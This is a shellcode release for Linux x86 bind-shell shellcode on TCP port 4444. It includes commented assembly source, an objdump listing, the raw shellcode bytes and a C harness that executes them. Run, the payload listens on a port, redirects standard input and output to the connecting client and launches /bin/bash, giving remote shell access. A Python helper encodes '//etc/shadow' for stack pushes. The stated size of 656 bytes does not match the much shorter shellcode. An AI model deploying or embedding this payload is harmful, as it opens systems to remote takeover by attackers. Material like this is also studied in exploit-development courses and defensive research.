// Title: Linux X86 Bind TCP:4444 (656 bytes)
// Author: Brandon Dennis
// Contact: bdennis@mail.hodges.edu
// Date: 5/24/2016
// ASM Source: https://github.com/slyth11907/x86-ASM-Linux-Intel/blob/master/Code-Examples/ShellCode/execve-stack-bind.asm

/*
; Filename: execve-stack-bind.asm
; Author: Brandon Dennis
; Date: 5/24/2016

; execve
; execve takes 3 arguments
; 1: filename: EX /bin/bash, 0x0
; 2: arguments for the executable(1st arg should be the filename then 2nd arg should be null or 0x0000)
; 3: envp is used for env settings, we can leave this as null: EX 0x0000

; Python code to get the instruction in HEX of the string reversed to place into the stack
; python -c 'string="//etc/shadow";splitNum=8;print "\nLength: %s" % len(string[::-1]);string=string[::-1].encode("hex"); \
; string=["push 0x"+str(string[i:i+splitNum]) for i in range(0, len(string), splitNum)]; \
; print "Hex List:\n"; print("\n".join(h for h in string))'


; Port: 4444 (\x5c\x11) in shellcode
; ShellCode---
; "\x31\xc0\x50\x66\xb8\x66\x00\x31\xdb\xb3\x01\x6a\x01\x6a\x02\x89\xe1\xcd\x80
; \x89\xc2\x31\xc0\x66\xb8\x66\x00\x31\xdb\xb3\x14\x6a\x04\x54\x6a\x02\x6a\x01
; \x52\x89\xe1\xcd\x80\x31\xc0\x66\xb8\x66\x00\x31\xdb\x53\xb3\x02\x66\x68\x11
; \x5c\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\x89\xe1\xcd\x80\x31\xc0\x31\xdb\x53
; \x66\xb8\x66\x00\xb3\x04\x52\x89\xe1\xcd\x80\x31\xc0\x31\xdb\x53\x53\x66\xb8
; \x66\x00\xb3\x05\x52\x89\xe1\xcd\x80\x89\xc2\x31\xc0\x31\xc9\xb0\x3f\x89\xd3
; \xcd\x80\x31\xc0\x31\xc9\xb0\x3f\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\xb1\x02\xcd
; \x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f
; \x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
; ShellCode---
; Bytes: 656
; Tested on: Linux 3.13.0-32, Ubuntu 12.04.5 LTS, X86


global _start

section .text

_start:


	; Create the socket FD
	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
	xor eax, eax
	push eax ; this is for our first arg as it is needing be be 0 for IPPROTO_IP
	mov ax, 102 ; moves syscall for socketcall into ax
	xor ebx, ebx ; 0's out ebx
	mov bl, 0x1 ; setting the socketcall type to sys_socket
	push 0x1 ; we now pass 1 onto the stack for SOCK_STREAM
	push 0x2 ; we now pass 2 onto the stack for AF_INET
	mov ecx, esp; this moves the memory location of our args to ecx
	int 0x80 ; execute the syscall socketcall
	mov edx, eax ; This allows us to save the FD from the socket

	; This avoids SIGSEGV when trying to reconnect
	; setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &socklen_t, socklen_t)

	xor eax, eax; 0's our eax
        mov ax, 102; moves syscall for socketcall into ax
	xor ebx, ebx; 0's out ebx
        mov bl, 0x14; moves the sys_setsocketopt as param 1

        push 0x4; push the sizeof onto the stack
        push esp; now we push the memory location of param 1(sizeof) onto the stack
        push 0x2; we now set the SO_REUSEADDR onto the stack
        push 0x1; we now set the SOL_SOCKET onto the stack
        push edx; this pushes our previous socket FD onto the stack
        mov ecx, esp; this pushes the memory location of our args into ecx
        int 0x80; execute the syscall socketcall


	; We now setup the bind
	; bind(sockfd, [AF_INET, 11111, INADDR_ANY], 16)
	xor eax, eax; 0's out eax
	mov ax, 102; moves syscall for socketcall into ax
	xor ebx, ebx; 0's out ebx
	push ebx; this pushes 0 onto the stack for our first arg of INADDR_ANY for our local host
	mov bl, 0x2; set the socketcall type to sys_bind
	push WORD 0x5c11; we now set the port to bind on, in reverse order is 4444
	push WORD 0x2; we now push the arg AF_INET onto the stack
	mov ecx, esp; we now grab our memeory location to our args
	push 0x16; we now set the sockaddr size onto the stack
	push ecx; we now push our memory location of our previous args onto the stack
	push edx; we push our current socket FD onto the stack
	mov ecx, esp; we now get our new socket FD
	int 0x80; execute the syscall socketcall


	; We now need to setup a passive socket to wait for the new connection
	; listen(sockfd, 0);
	xor eax, eax; 0's our eax
	xor ebx, ebx; 0's out ebx
	push ebx; this pushes our 2nd arg for connection que size to 0
	mov ax, 102; moves syscall for socketcall into ax
	mov bl, 0x4; we now set the socketcall type to sys_listen
	push edx; we now push our socket FD onto the stack
	mov ecx, esp; we now move the memory location of our args list into ecx
	int 0x80; execute the syscall for socketcall with the listen type

	; We now accept the connection when it comes in
	; accept(sockfd, NULL, NULL)

	xor eax, eax; 0's our eax
	xor ebx, ebx; 0's out ebx
	push ebx; we add these 2 0's since we dont need information on the client connecting to us
	push ebx
        mov ax, 102; moves syscall for socketcall int ax
        mov bl, 0x5; we set the socketcall type to sys_accept
	push edx; we push our Socket FD onto the stack
	mov ecx, esp; we grab the memeory location of our args and move it to ecx
	int 0x80; execute the syscall socketcall
	mov edx, eax; this saves the Socket FD for the client


	; We can now use dup2 to create all 3 of our std's, in/out/err so that our shellhas access to it over the socket
	; dup2(clientfd)
	xor eax, eax; 0's out eax
	xor ecx, ecx; 0's out ecx since our first std FD is in so its 0
	mov al, 63; we now move the syscall for dup2 into al
	mov ebx, edx; we now move the client socket FD into ebx
	int 0x80; execute the dup2 syscall

	xor eax, eax; 0's out the eax reg due to any return's happening
	xor ecx, ecx; 0's out ecx
        mov al, 63; this is the syscall for dup2
        mov cl, 0x1; we now set cl to the FD of stdout
        int 0x80; execut the dup2 syscall

	xor eax, eax; 0's out eax
        mov al, 63; moves the dup2 syscall
        mov cl, 0x2; we now set cl to the stderr FD
        int 0x80; execute the dup2 syscall


	; We can now execute our shell in /bin/bash

	xor eax, eax ; we first need our nulls
	push eax ; this will push a drowd of nulls onto the stack


	; this section of pushes are the string ////bin/bash from our pyhton 1 liner above
	push 0x68736162
	push 0x2f6e6962
	push 0x2f2f2f2f

	mov ebx, esp ; this moves the memory address of esp(pointing to our string & nulls)
		     ; from the stack into ebx where execve is expecting the name of the application + a null
	push eax ; this pushes another null onto the stack
	mov edx, esp ; this now gets the memory address of the nulls we just pushed onto the stack into edx, this is for envp so it can just be null
	push ebx ; this pushes the memory address of our string onto the stack
	mov ecx, esp ; this moves the address of our string from the stack to ecx
	mov al, 0xb ; this will load the syscall # 11
	int 0x80 ; execute the system call
*/

// Python code to get the instruction in HEX of the string reversed to place into the stack
// python -c 'string="//etc/shadow";splitNum=8;print "\nLength: %s" % len(string[::-1]);string=string[::-1].encode("hex"); \
// string=["push 0x"+str(string[i:i+splitNum]) for i in range(0, len(string), splitNum)]; \
// print "Hex List:\n"; print("\n".join(h for h in string))'


// Port: 4444 (\x5c\x11) in shellcode
// ShellCode---
// Bytes: 656
// Tested on: Linux 3.13.0-32, Ubuntu 12.04.5 LTS, X86

//------------- OBJDUMP -------------
//execve-stack-bind:     file format elf32-i386

//Disassembly of section .text:
//8048060 <_start>:
 //8048060:	31 c0                	xor    eax,eax
 //8048062:	50                   	push   eax
 //8048063:	66 b8 66 00          	mov    ax,0x66
 //8048067:	31 db                	xor    ebx,ebx
 //8048069:	b3 01                	mov    bl,0x1
 //804806b:	6a 01                	push   0x1
 //804806d:	6a 02                	push   0x2
 //804806f:	89 e1                	mov    ecx,esp
 //8048071:	cd 80                	int    0x80
 //8048073:	89 c2                	mov    edx,eax
 //8048075:	31 c0                	xor    eax,eax
 //8048077:	66 b8 66 00          	mov    ax,0x66
 //804807b:	31 db                	xor    ebx,ebx
 //804807d:	b3 14                	mov    bl,0x14
 //804807f:	6a 04                	push   0x4
 //8048081:	54                   	push   esp
 //8048082:	6a 02                	push   0x2
 //8048084:	6a 01                	push   0x1
 //8048086:	52                   	push   edx
 //8048087:	89 e1                	mov    ecx,esp
 //8048089:	cd 80                	int    0x80
 //804808b:	31 c0                	xor    eax,eax
 //804808d:	66 b8 66 00          	mov    ax,0x66
 //8048091:	31 db                	xor    ebx,ebx
 //8048093:	53                   	push   ebx
 //8048094:	b3 02                	mov    bl,0x2
 //8048096:	66 68 11 5c          	pushw  0x5c11
 //804809a:	66 6a 02             	pushw  0x2
 //804809d:	89 e1                	mov    ecx,esp
 //804809f:	6a 16                	push   0x16
 //80480a1:	51                   	push   ecx
 //80480a2:	52                   	push   edx
 //80480a3:	89 e1                	mov    ecx,esp
 //80480a5:	cd 80                	int    0x80
 //80480a7:	31 c0                	xor    eax,eax
 //80480a9:	31 db                	xor    ebx,ebx
 //80480ab:	53                   	push   ebx
 //80480ac:	66 b8 66 00          	mov    ax,0x66
 //80480b0:	b3 04                	mov    bl,0x4
 //80480b2:	52                   	push   edx
 //80480b3:	89 e1                	mov    ecx,esp
 //80480b5:	cd 80                	int    0x80
 //80480b7:	31 c0                	xor    eax,eax
 //80480b9:	31 db                	xor    ebx,ebx
 //80480bb:	53                   	push   ebx
 //80480bc:	53                   	push   ebx
 //80480bd:	66 b8 66 00          	mov    ax,0x66
 //80480c1:	b3 05                	mov    bl,0x5
 //80480c3:	52                   	push   edx
 //80480c4:	89 e1                	mov    ecx,esp
 //80480c6:	cd 80                	int    0x80
 //80480c8:	89 c2                	mov    edx,eax
 //80480ca:	31 c0                	xor    eax,eax
 //80480cc:	31 c9                	xor    ecx,ecx
 //80480ce:	b0 3f                	mov    al,0x3f
 //80480d0:	89 d3                	mov    ebx,edx
 //80480d2:	cd 80                	int    0x80
 //80480d4:	31 c0                	xor    eax,eax
 //80480d6:	31 c9                	xor    ecx,ecx
 //80480d8:	b0 3f                	mov    al,0x3f
 //80480da:	b1 01                	mov    cl,0x1
 //80480dc:	cd 80                	int    0x80
 //80480de:	31 c0                	xor    eax,eax
 //80480e0:	b0 3f                	mov    al,0x3f
 //80480e2:	b1 02                	mov    cl,0x2
 //80480e4:	cd 80                	int    0x80
 //80480e6:	31 c0                	xor    eax,eax
 //80480e8:	50                   	push   eax
 //80480e9:	68 62 61 73 68       	push   0x68736162
 //80480ee:	68 62 69 6e 2f       	push   0x2f6e6962
 //80480f3:	68 2f 2f 2f 2f       	push   0x2f2f2f2f
 //80480f8:	89 e3                	mov    ebx,esp
 //80480fa:	50                   	push   eax
 //80480fb:	89 e2                	mov    edx,esp
 //80480fd:	53                   	push   ebx
 //80480fe:	89 e1                	mov    ecx,esp
 //8048100:	b0 0b                	mov    al,0xb
 //8048102:	cd 80                	int    0x80
//------------- OBJDUMP -------------

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x66\xb8\x66\x00\x31\xdb\xb3\x01\x6a\x01\x6a\x02\x89\xe1\xcd\x80"
"\x89\xc2\x31\xc0\x66\xb8\x66\x00\x31\xdb\xb3\x14\x6a\x04\x54\x6a\x02\x6a\x01"
"\x52\x89\xe1\xcd\x80\x31\xc0\x66\xb8\x66\x00\x31\xdb\x53\xb3\x02\x66\x68"
"\x11\x5c" //<----PORT #4444
"\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\x89\xe1\xcd\x80\x31\xc0\x31\xdb\x53"
"\x66\xb8\x66\x00\xb3\x04\x52\x89\xe1\xcd\x80\x31\xc0\x31\xdb\x53\x53\x66\xb8"
"\x66\x00\xb3\x05\x52\x89\xe1\xcd\x80\x89\xc2\x31\xc0\x31\xc9\xb0\x3f\x89\xd3"
"\xcd\x80\x31\xc0\x31\xc9\xb0\x3f\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\xb1\x02\xcd"
"\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f"
"\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";


main()
{
printf("Shellcode Length: %d\n", strlen(code));
int (*ret)() = (int(*)())code;
ret();
}